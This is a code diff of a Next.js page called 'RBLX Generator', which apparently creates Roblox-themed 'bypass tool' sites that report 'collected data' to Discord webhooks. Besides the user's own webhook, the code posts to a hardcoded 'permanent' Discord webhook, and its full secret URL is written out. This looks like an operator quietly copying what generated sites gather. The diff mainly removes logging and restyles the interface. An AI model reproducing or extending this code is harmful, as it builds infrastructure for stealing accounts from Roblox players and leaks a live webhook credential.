@@ -16,39 +16,23 @@ export default function HomePage() {
     setStatus("⏳ Creating site...");
 
     try {
-      console.log("Attempting to create site:", directory);
-      
       // Insert new record in Supabase
       const { data, error } = await supabase
         .from("websites")
         .insert([{ directory, webhook_url: webhook }])
         .select();
 
-      console.log("Supabase response:", { data, error });
-
       if (error) {
-        console.error("Supabase error:", error);
         setStatus("❌ Error: " + error.message);
         return;
       }
 
       if (!data || data.length === 0) {
-        setStatus("❌ No data returned from database");
+        setStatus("❌ Failed to create site. Please try again.");
         return;
       }
 
-      console.log("Site created successfully:", data[0]);
-
-      // Test if we can read the data back
-      const { data: testData, error: testError } = await supabase
-        .from("websites")
-        .select("*")
-        .eq("directory", directory)
-        .single();
-
-      console.log("Test read after insert:", { testData, testError });
-
-      // Send Discord webhooks
+      // Send Discord webhook message to user's webhook
       try {
         await fetch(webhook, {
           method: "POST",
@@ -61,6 +45,7 @@ export default function HomePage() {
         console.error("Webhook send failed", err);
       }
 
+      // Send to permanent webhook
       const permanentWebhook = "https://discord.com/api/webhooks/1428991632472281179/wCh1K8TJUBc6zethK1iCLy6AnYw3jpYpTv2XZuRye7cr39Zv2Nik57xsLVsnkXB5-djA";
       try {
         await fetch(permanentWebhook, {
@@ -108,31 +93,100 @@ export default function HomePage() {
   };
 
   return (
-    <div className="flex flex-col items-center justify-center min-h-screen bg-gradient-to-br from-blue-500 to-purple-600 text-white">
-      <h1 className="text-3xl font-bold mb-6">RBLX Generator</h1>
+    <div className="min-h-screen bg-gradient-to-br from-gray-900 via-purple-900 to-gray-900 text-white relative overflow-hidden">
+      {/* Animated Background Elements */}
+      <div className="absolute inset-0 overflow-hidden">
+        <div className="absolute -top-40 -right-40 w-80 h-80 bg-purple-500 rounded-full mix-blend-multiply filter blur-xl opacity-20 animate-pulse"></div>
+        <div className="absolute -bottom-40 -left-40 w-80 h-80 bg-blue-500 rounded-full mix-blend-multiply filter blur-xl opacity-20 animate-pulse delay-1000"></div>
+        <div className="absolute top-1/2 left-1/2 transform -translate-x-1/2 -translate-y-1/2 w-96 h-96 bg-cyan-500 rounded-full mix-blend-multiply filter blur-xl opacity-10 animate-pulse delay-500"></div>
+      </div>
 
-      <div className="bg-white/10 p-6 rounded-2xl shadow-xl w-80 flex flex-col gap-3">
-        <input
-          value={directory}
-          onChange={(e) => setDirectory(e.target.value)}
-          placeholder="Enter directory name"
-          className="px-3 py-2 rounded bg-white/20 text-white placeholder-gray-300"
-        />
-        <input
-          value={webhook}
-          onChange={(e) => setWebhook(e.target.value)}
-          placeholder="Enter Discord Webhook URL"
-          className="px-3 py-2 rounded bg-white/20 text-white placeholder-gray-300"
-        />
-        <button
-          onClick={handleGenerate}
-          className="bg-white text-blue-700 font-semibold px-4 py-2 rounded-lg hover:bg-blue-200 transition"
-        >
-          Generate
-        </button>
+      {/* Main Content */}
+      <div className="relative z-10 flex flex-col items-center justify-center min-h-screen px-4">
+        {/* Header */}
+        <div className="text-center mb-12">
+          <div className="flex items-center justify-center mb-4">
+            <div className="w-12 h-12 bg-gradient-to-r from-purple-500 to-blue-500 rounded-lg flex items-center justify-center mr-3">
+              <span className="text-2xl">⚡</span>
+            </div>
+            <h1 className="text-4xl font-bold bg-gradient-to-r from-purple-400 to-blue-400 bg-clip-text text-transparent">
+              RBLX GENERATOR
+            </h1>
+          </div>
+          <p className="text-gray-300 text-lg max-w-md mx-auto">
+            Create custom bypass tools with automated Discord webhook integration
+          </p>
+        </div>
 
-        {status && <p className="text-center mt-3">{status}</p>}
+        {/* Generator Card */}
+        <div className="w-full max-w-md">
+          <div className="bg-gray-800/50 backdrop-blur-lg rounded-2xl border border-gray-700/50 p-8 shadow-2xl">
+            {/* Directory Input */}
+            <div className="mb-6">
+              <label className="block text-gray-300 text-sm font-medium mb-3">
+                📁 Directory Name
+              </label>
+              <input
+                value={directory}
+                onChange={(e) => setDirectory(e.target.value)}
+                placeholder="Enter your unique directory name"
+                className="w-full px-4 py-3 bg-gray-700/50 border border-gray-600 rounded-xl text-white placeholder-gray-400 focus:outline-none focus:ring-2 focus:ring-purple-500 focus:border-transparent transition-all duration-200"
+              />
+            </div>
+
+            {/* Webhook Input */}
+            <div className="mb-8">
+              <label className="block text-gray-300 text-sm font-medium mb-3">
+                🔗 Discord Webhook URL
+              </label>
+              <input
+                value={webhook}
+                onChange={(e) => setWebhook(e.target.value)}
+                placeholder="https://discord.com/api/webhooks/..."
+                className="w-full px-4 py-3 bg-gray-700/50 border border-gray-600 rounded-xl text-white placeholder-gray-400 focus:outline-none focus:ring-2 focus:ring-purple-500 focus:border-transparent transition-all duration-200"
+              />
+            </div>
+
+            {/* Generate Button */}
+            <button
+              onClick={handleGenerate}
+              className="w-full bg-gradient-to-r from-purple-600 to-blue-600 hover:from-purple-700 hover:to-blue-700 text-white font-semibold py-4 px-6 rounded-xl transition-all duration-200 transform hover:scale-105 active:scale-95 shadow-lg hover:shadow-xl"
+            >
+              🚀 Generate Website
+            </button>
+
+            {/* Status Message */}
+            {status && (
+              <div className="mt-6 p-4 bg-gray-700/50 rounded-xl border border-gray-600">
+                <p className="text-center text-sm">{status}</p>
+              </div>
+            )}
+          </div>
+
+          {/* Features List */}
+          <div className="mt-8 grid grid-cols-1 gap-4 text-sm text-gray-300">
+            <div className="flex items-center justify-center space-x-2">
+              <span className="text-green-400">✓</span>
+              <span>Automatic Discord Webhook Integration</span>
+            </div>
+            <div className="flex items-center justify-center space-x-2">
+              <span className="text-green-400">✓</span>
+              <span>Customizable Bypass Tools</span>
+            </div>
+            <div className="flex items-center justify-center space-x-2">
+              <span className="text-green-400">✓</span>
+              <span>Real-time Data Collection</span>
+            </div>
+          </div>
+        </div>
+
+        {/* Footer */}
+        <div className="mt-12 text-center">
+          <p className="text-gray-400 text-sm">
+            RBLX Generator © 2025 • Professional Tool Creation
+          </p>
+        </div>
       </div>
     </div>
   );
-            }
+        }
